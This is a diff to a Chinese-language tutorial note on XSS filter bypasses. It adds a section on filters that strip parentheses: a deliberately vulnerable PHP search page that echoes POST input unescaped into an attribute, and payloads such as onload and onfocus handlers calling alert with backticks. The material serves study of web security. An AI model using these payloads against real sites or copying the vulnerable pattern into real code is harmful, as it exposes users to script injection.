@@ -264,7 +264,22 @@ Chrome会动态修正一些节点，如将</script x\>修正为</script>，由�
 "><div onclick="alert('xss')">click me<"
 ```
 
+## 过滤括号
 
+```php
+<?php 
+    ini_set("display_errors", 0); 
+	$str = strtolower(@$_POST["keyword"]); 
+	while (strpos($str,'script')) {$str = str_replace('script', '', $str);} 
+	$str = str_replace('(', '', $str); 
+	$str = str_replace(')', '', $str); 
+	echo ' <form class="main" action="index.php" method="POST"> <input name=keyword size=60 value="'.$str.'"> <input type=submit name=submit value="Search"/> </form>'; echo '<p class="main">No results for "<b>'.htmlspecialchars($str).'</b>"</p>'; ?>
+```
+
+```
+"><body onload=alert`1`><"
+" onfocus=alert`1` "
+```
 
 ##  危险字符
 
